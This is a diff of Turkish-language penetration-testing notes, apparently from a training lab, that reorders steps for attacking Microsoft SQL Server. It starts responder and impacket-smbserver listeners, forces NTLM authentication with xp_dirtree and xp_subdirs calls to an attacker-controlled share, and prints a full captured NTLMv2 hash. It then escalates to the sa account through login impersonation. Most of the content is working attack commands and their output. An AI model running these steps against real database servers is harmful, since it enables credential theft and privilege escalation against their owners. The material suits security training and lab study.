@@ -314,23 +314,42 @@ SELECT * FROM OPENROWSET(BULK N'C:/Windows/System32/drivers/etc/hosts', SINGLE_C
 GO
 ```
 
-### MSSQL Service  `XP_SUBDIRS` Hash Çalma
+### MSSQL Service  `XP_SUBDIRS` Hash Çalma 
 
-**Altetrnative tool:**
+##### 1. Ağ Trafiğini Yakalamak  için ilk  ***`responder`*** ile dinle. Eğer hash gelmez ise  ***`impacket-smbserver`*** ile listener açınız ve listeyi sırayla uygula.
+
+```bash
+responder -I tun0
+
+[+] Listening for events...      
+```
++  Ağ Trafiğini Yakalama `impacket-smbserver`
+
+```bash
+impacket-smbserver share ./ -smb2support
+
+Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 
+```
+
+
+##### 2. sistemde hashi yakalamak için aşağıdaki komutlardan birini yürütünüz.
+
 ` XP_DIRTREE` Hash Çalma
 ```sql
-EXEC master..xp_dirtree '\\10.10.110.17\share\'
+EXEC master..xp_dirtree '\\your-tun0\share\'
 GO
 ```
 
-#### XP_SUBDIRS
+**Altetrnative tool:** `XP_SUBDIRS`
 
-##### 1 
 ```sql
-EXEC master..xp_subdirs '\\10.10.110.17\share\'
+EXEC master..xp_subdirs '\\your-tun0\share\'
 GO
 ```
-##### 2 Ağ Trafiğini Yakalama `responder`
+
+
+##### 3. Hash geldiyse şu şekilde görünür
+
 
 ```bash
 responder -I tun0
@@ -340,7 +359,8 @@ responder -I tun0
 [SMB] NTLMv2-SSP Username : SRVMSSQL\demouser
 [SMB] NTLMv2-SSP Hash     : demouser::WIN7BOX:5e3ab1c4380b94a1:A18830632D52768440B7E2425C4A7107:0101000000000000009BFFB9DE3DD801D5448EF4D0BA034D0000000002000800510053004700320001001E00570049004E002D003500440050005A0033005200530032004F005800320004003400570049004E002D003500440050005A0033005200530032004F00580013456F0051005300470013456F004C004F00430041004C000300140051005300470013456F004C004F00430041004C000500140051005300470013456F004C004F00430041004C0007000800009BFFB9DE3DD80106000400020000000800300030000000000000000100000000200000ADCA14A9054707D3939B6A5F98CE1F6E5981AC62CEC5BEAD4F6200A35E8AD9170A0010000000000000000000000000000000000009001C0063006900660073002F00740065007300740069006E006700730061000000000000000000
 ```
-+  Ağ Trafiğini Yakalama `impacket-smbserver`
+
+**Yada**
 
 ```bash
 impacket-smbserver share ./ -smb2support
@@ -353,7 +373,9 @@ impacket-smbserver share ./ -smb2support
 [*] Closing down connection (10.129.203.7,49728)              
 ```
 
-##### 3. Hashi Aldık  MSSQL ile Mevcut Kullanıcıların Kimliğine Bürünme `IMPERSONATE`
+
+
+##### 4. Hashi Aldık  MSSQL ile Mevcut Kullanıcıların Kimliğine Bürünme `IMPERSONATE`
 
 **Kullanıcıyı Taklit Edebileceğimizi Belirleyin**
 
@@ -376,7 +398,7 @@ valentin
 
 **yukarıdaki çıktıda  `sa`, `ben` ve `valentin` Taklit etme iznini veren taraf;**
 
-##### 4. Mevcut Kullanıcımızı ve Rolümüzü Doğrulama
+##### 5. Mevcut Kullanıcımızı ve Rolümüzü Doğrulama
 
 ```sql
 SELECT SYSTEM_USER
@@ -395,7 +417,7 @@ julio
 **`0`** döndüğü için sistem **sysadmin rolüne sahip değil  ancak `sa` kullanıcısının kimliğine bürünebileceğimizi gösterir.**
 
 
-##### 5.  Şimdi `sa` kullanıcının kimliğine bürünelim ve aynı komutları çalıştıralım
+##### 6.  Şimdi `sa` kullanıcının kimliğine bürünelim ve aynı komutları çalıştıralım
 
 ```sql
 EXECUTE AS LOGIN = 'sa'
@@ -435,7 +457,6 @@ GO
 ```
 
 **Not: Sistem yöneticisi (sysadmin) olmayan bir kullanıcı tespit edersek, söz konusu kullanıcının başka veritabanlarına veya bağlantılı sunuculara (linked servers) erişimi olup olmadığını yine de kontrol edebiliriz.**
-
 
 
 
